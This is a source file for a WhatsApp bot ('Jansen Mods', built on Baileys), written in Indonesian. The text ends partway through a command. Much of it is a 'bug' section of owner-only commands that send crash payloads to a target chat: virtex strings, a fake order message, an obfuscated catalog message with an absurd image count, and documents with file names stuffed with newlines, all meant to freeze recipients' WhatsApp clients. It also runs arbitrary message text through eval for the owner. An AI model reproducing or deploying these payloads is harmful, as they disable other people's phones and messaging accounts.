/*
// Buat Lu Yang Jual Sc Ini Yang Jujur Jangan Sampe Nipu 
   Apalagi Lari Dari Tanggung Jawab

// Base Jansen Mods : Copyan Dari Base Dika

› Create BY JANSEN
› Base Ori JANSEN
› Copyan Base Dika Hisoka Morou

🌷 KALAU MAU RENAME TARO CREDITS GUA :JANSEN MODS*/

//=================================================//
require('./jans')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const os = require('os')
const mathjs = require('mathjs')
const chalk = require('chalk')
const cl = require('caliph-api') 
const axios = require('axios')
const path = require('path')
const mel = require('kitsune-api')
const moment = require('moment-timezone')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { exec, spawn, execSync } = require("child_process")
const { virtex, vipi } = require('./basejansen/virtex/virtex.js')
const { ngazap } = require('./basejansen/virtex/ngazap')
const { buttonvirus } = require('./basejansen/virtex/buttonvirus')
const { buttonkal } = require('./basejansen/virtex/buttonkal')
const { bugsw } = require('./basejansen/virtex/bugsw')
const { iphone } = require('./basejansen/virtex/iphone')
const { iphone1 } = require('./basejansen/virtex/iphone1')
const { iphone2 } = require('./basejansen/virtex/iphone2')
const { iphone3 } = require('./basejansen/virtex/iphone3')
const { iphone4 } = require('./basejansen/virtex/iphone4')
const { iphone5 } = require('./basejansen/virtex/iphone5')
const { iphone6 } = require('./basejansen/virtex/iphone6')
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./basejansen/lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
//=================================================//
//=================================================//
virgam = fs.readFileSync(`./basejansen/image/deden.jpeg`)
const content = JSON.stringify(m.message)
/*const cerpen = require('./basejansen/lib/cerpen')*/
const kalimage = fs.readFileSync ('./basejansen/image/jansengans.jpg')
const thumbnail = fs.readFileSync ('./basejansen/image/mamak.jpg')
const { mediafireDl } = require('./basejansen/lib/mediafire.js')
const banned = JSON.parse(fs.readFileSync('./basejansen/dbnye/banned.json'))
const ntilink = JSON.parse(fs.readFileSync("./basejansen/lib/antilink.json"))
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const wita = moment(Date.now()).tz('Asia/Makassar').locale('id').format('HH:mm:ss z')
const wit = moment(Date.now()).tz('Asia/Jayapura').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const qtod = m.quoted? "true":"false"
//=================================================//
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]
//=================================================//
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Petang'
 }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore'
 }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang'
 }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi'
 }
if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Malam'
 }
moment.tz.setDefault("Asia/Jakarta").locale("id");
//=================================================//
module.exports = jansen = async (jansen, m, chatUpdate, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
//=================================================//
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await jansen.decodeJid(jansen.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const isBan = banned.includes(m.sender)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
const groupMetadata = m.isGroup ? await jansen.groupMetadata(m.chat).catch(e => {}) : ''
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const welcm = m.isGroup ? wlcm.includes(from) : false
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
const AntiLink = m.isGroup ? ntilink.includes(from) : false 
const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
const AntiNsfww = m.isGroup ? ntnsfww.includes(from) : false
//=================================================//
const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
"mimetype": "image/webp",
"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
"fileLength": "14240",
"mediaKeyTimestamp": "1664991742",
"isAnimated": false
}}}
//=================================================//
const deploy = (teks) => {
  jansen.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}
//=================================================//
const reply = (teks) => {
return jansen.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/@jansenmods`}}}, { quoted: m })} 
//=================================================//
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
let chats = global.db.data.chats[m.chat]
if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
if (chats) {
if (!('mute' in chats)) chats.mute = false
} else global.db.data.chats[m.chat] = {
mute: false,
}
let settings = db.data.settings[botNumber]
if (typeof settings !== 'object') db.data.settings[botNumber] = {}
if (settings) {
if (!('available' in settings)) settings.available = true
if (!('composing' in settings)) settings.composing = false
if (!('recording' in settings)) settings.recording = false
} else db.data.settings[botNumber] = {
available: true,
composing: false,
recording: false,
}
} catch (err) {
console.log(err)
}
//=================================================//
if (!jansen.public) {
if (!m.key.fromMe) return
}
if (m.message) {
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CMD \x1b[1;37m]', time, chalk.
green(), 'from', chalk.green(pushname), 'in', chalk.green(groupName ? groupName : 'Private Chat' ), 'args :', chalk.green(text.length))
 }
//=================================================// 
let cron = require('node-cron')
cron.schedule('00 12 * * *', () => {
let user = Object.keys(global.db.data.users)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
for (let jid of user) global.db.data.users[jid].limit = limitUser
console.log('Reseted Limit')
}, {
scheduled: true,
timezone: "Asia/Jakarta"
})
//=================================================// 
var sticWait = (hehe) => {
ano = fs.readFileSync('./basejansen/stickernye/wait.webp')
jansen.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticAdmin = (hehe) => {
ano = fs.readFileSync('./basejansen/stickernye/BotAdman.webp')
jansen.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticOwner = (hehe) => {
ano = fs.readFileSync('./basejansen/stickernye/owner.webp')
jansen.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticSukses = (hehe) => {
ano = fs.readFileSync('./basejansen/stickernye/SuksesCok.webp')
jansen.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticBanLu = (hehe) => {
ano = fs.readFileSync('./basejansen/stickernye/BanLu.webp')
jansen.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var groupon = (hehe) => {
ano = fs.readFileSync('./basejansen/stickernye/groupon.webp')
jansen.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var SiGroupadmin = (hehe) => {
ano = fs.readFileSync('./basejansen/stickernye/SiGroupadmin.webp')
jansen.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
   // autovn
if(autorecording){
if(autorecording == false)
await jansen.sendPresenceUpdate('recording', m.chat)
} else if(autoketik){
if(autoketik == false)
await jansen.sendPresenceUpdate('composing', m.chat)
} else if(autoavailable){
if(autoavailable == true)
await jansen.sendPresenceUpdate('available', m.chat)
}
//=================================================//
// Mute Chat
if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
return
}
//=================================================//
// AntiLink
if (AntiLink) {
linkgce = await jansen.groupInviteCode(from)
if (budy.includes(`https://chat.whatsapp.com/${linkgce}`)) {
m.reply(`\`\`\`「 Detect Link 」\`\`\`\n\nAnda tidak akan dikick bot karena yang anda kirim adalah link group yg ada di group ini`)
} else if (isUrl(m.text)) {
bvl = `\`\`\`「 Detect Link 」\`\`\`\n\nAdmin telah mengirim link, admin dibebaskan untuk mengirim link apapun`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
await jansen.groupParticipantsUpdate(m.chat, [kice], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
jansen.sendMessage(from, {text:`\`\`\`「 Detect Link 」\`\`\`\n\n@${kice.split("@")[0]} Telah dikick karena send link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
}
//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
userJid: jansen.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, jansen.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
jansen.ev.emit('messages.upsert', msg)
}
//=================================================//
if (budy.startsWith('©️')) {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}
//=================================================//
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`
Apakah Ada Yang Ingin Di Tanyakan ${reason ? 'Ada Yang Bisa Saya Bantu? ' + reason : 'Terima Kasih'}
Waktu ${clockString(new Date - afkTime)}
`.trim())
}
if (db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
m.reply(`
Hello Saya Bot Jansen Mods${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
//=================================================//
switch(command) {
//=================================================//
// JADI BUG /)

case 'jaditroli': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} jansen`)
let teks = `${q}`
{
a = await jansen.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${teks}`,
"orderTitle": `${teks}`,
"sellerJid": "6281364399250@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: m.chat, quoted: doc })
jansen.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
}
break
case 'jadilokas': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} jansen`)
let teks = `${q}`
{
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./basejansen/image/jansengans.jpg') }, { upload: jansen.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": ` ${teks} ${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
jansen.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
}
break
case 'jadipolling': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} jansen`)
let teks = `${q}`
{
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": `Salam kenal saya ${teks}`,
"options": [
	{
"optionName": `Saya ${teks}`
	},
	{
"optionName": `Dimari Kalau Ada ${teks} Jangan lari`
	}
],
"selectableOptionsCount": 2
	}
}), { userJid: m.chat, quoted: m })
jansen.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
}
}
break
case 'jadikatalog': case 'jansenkatalog': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image/sticker'
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
function _0x348d(_0x50ce67,_0x2397a1){var _0x15bb19=_0x15bb();return _0x348d=function(_0x348dc9,_0x408474){_0x348dc9=_0x348dc9-0x173;var _0x50d082=_0x15bb19[_0x348dc9];return _0x50d082;},_0x348d(_0x50ce67,_0x2397a1);}var _0x7bda59=_0x348d;(function(_0x2b7a6b,_0x258fac){var _0x3a2d72=_0x348d,_0x26e08e=_0x2b7a6b();while(!![]){try{var _0x574dc3=-parseInt(_0x3a2d72(0x179))/0x1+-parseInt(_0x3a2d72(0x183))/0x2+-parseInt(_0x3a2d72(0x176))/0x3+parseInt(_0x3a2d72(0x17e))/0x4+-parseInt(_0x3a2d72(0x182))/0x5+parseInt(_0x3a2d72(0x180))/0x6+-parseInt(_0x3a2d72(0x173))/0x7;if(_0x574dc3===_0x258fac)break;else _0x26e08e['push'](_0x26e08e['shift']());}catch(_0x36dddf){_0x26e08e['push'](_0x26e08e['shift']());}}}(_0x15bb,0xac052));let media=await quoted[_0x7bda59(0x17d)](quoted);function _0x15bb(){var _0x1beac5=['586320XahqHr','chat','waUploadToServer','key','download','5612456xbkxWC','message','6419334pqEaRs','JANSEN\x20MODS\x20','1899640aXNWfS','473494FRUydx','3030587FfNbLm','Message','wa.me/6281364399250','397419wzTxRp','6281364399250@s.whatsapp.net','fromObject'];_0x15bb=function(){return _0x1beac5;};return _0x15bb();}var messa=await prepareWAMessageMedia({'image':media},{'upload':jansen[_0x7bda59(0x17b)]}),catalog=generateWAMessageFromContent(m['chat'],proto[_0x7bda59(0x174)][_0x7bda59(0x178)]({'productMessage':{'product':{'productImage':messa['imageMessage'],'productId':'','jpegThumbnail':kalimage,'title':text+'\x20'+buttonkal,'description':text+'\x20'+buttonkal,'productImageCount':0x3b9ac9ff,'firstImageId':0x1,'retailerId':_0x7bda59(0x181)+bugsw,'bodyText':''+text,'footerText':''+text,'url':_0x7bda59(0x175)},'businessOwnerJid':_0x7bda59(0x177),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m[_0x7bda59(0x17a)],'quoted':doc});jansen['relayMessage'](m[_0x7bda59(0x17a)],catalog[_0x7bda59(0x17f)],{'messageId':catalog[_0x7bda59(0x17c)]['id']});
}
}
break
case 'jadidocu': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} jansen`)
let teks = `${q}`
{
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔥 ${teks} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat })
jansen.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break
//=================================================//
case 'jadidarknes': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} jansen`)
let teks = `${q}`
{
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
"mimetype": "*/*",
"title": "IMG-20220802-WA0052.jpeg",
"fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
"pageCount": 0,
"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
"fileName": `🔥 ${teks} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
"mediaKeyTimestamp": "1659416157",
}
}), { userJid: m.chat })
jansen.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break
case 'jadivirtext1': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} jansen`)
let teks = `${q}`
{
jansen.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg' }, caption: `🔥 ${teks} ${iphone}` }, { quoted: doc })
}
}
break
case 'jadivirtext2': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} jansen`)
let teks = `${q}`
{
jansen.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg' }, caption: `🔥 ${teks} ${iphone1}` }, { quoted: doc })
}
}
break
case 'jadivirtex3t': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} jansen`)
let teks = `${q}`
{
jansen.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg' }, caption: `🔥 ${teks} ${iphone2}` }, { quoted: doc })
}
}
break
case 'jadivirtext4': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} jansen`)
let teks = `${q}`
{
jansen.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg' }, caption: `🔥 ${teks} ${iphone3}` }, { quoted: doc })
}
}
break
case 'jadivirtext5': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} jansen`)
let teks = `${q}`
{
jansen.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg' }, caption: `🔥 ${teks} ${iphone4}` }, { quoted: doc })
}
}
break
case 'jadivirtext6': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} jansen`)
let teks = `${q}`
{
jansen.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg' }, caption: `🔥 ${teks} ${iphone5}` }, { quoted: doc })
}
}
break
case 'jadivirtext7': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} jansen`)
let teks = `${q}`
{
jansen.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg' }, caption: `🔥 ${teks} ${iphone6}` }, { quoted: doc })
}
}
break
case 'jadivirtext8': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} jansen`)
let teks = `${q}`
{
jansen.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg' }, caption: `🔥 ${teks} ${buttonkal}` }, { quoted: doc })
}
}
break
case 'jadivirtext9': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} jansen`)
let teks = `${q}`
{
jansen.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg' }, caption: `🔥 ${teks} ${buttonvirus}` }, { quoted: doc })
}
}
break
case 'jadivirtext10': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} jansen`)
let teks = `${q}`
{
jansen.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg' }, caption: `🔥 ${teks} ${ngazap(prefix)}`}, { quoted: doc })
}
}
break
case 'jadibuginvite': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} jansen`)
let teks = `${q}`
{
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./basejansen/image/jansengans.jpg') }, { upload: jansen.waUploadToServer })
